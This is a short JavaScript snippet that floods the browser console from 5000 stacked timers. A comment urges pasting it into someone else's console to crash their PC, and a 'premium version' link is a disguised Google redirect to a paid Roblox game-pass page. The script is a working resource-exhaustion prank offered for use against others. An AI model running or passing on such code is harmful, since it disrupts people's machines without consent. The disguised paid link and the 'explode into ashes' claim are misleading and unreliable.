function distributedConsoleLogs() {
    const numberOfSources = 5000;

    for (let i = 1; i <= numberOfSources; i++) {
        setTimeout(() => {
            setInterval(() => {
                console.log(`this is basic version if you want the normal version check it out #${i}!`);
            }, 0.1);
        }, i * 0.1);
    }
}

distributedConsoleLogs();

// paste this in someone's console and watch their PC explode into ashes
// premium version: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwia_oC3qo6GAxVGSmwGHXmXBZkQFnoECAYQAQ&url=https%3A%2F%2Fwww.roblox.com%2Fgame-pass%2F2611360%2Fbuy-for-500-robux&usg=AOvVaw1TbPzsxOvIj4hnVuKdsOad&opi=89978449
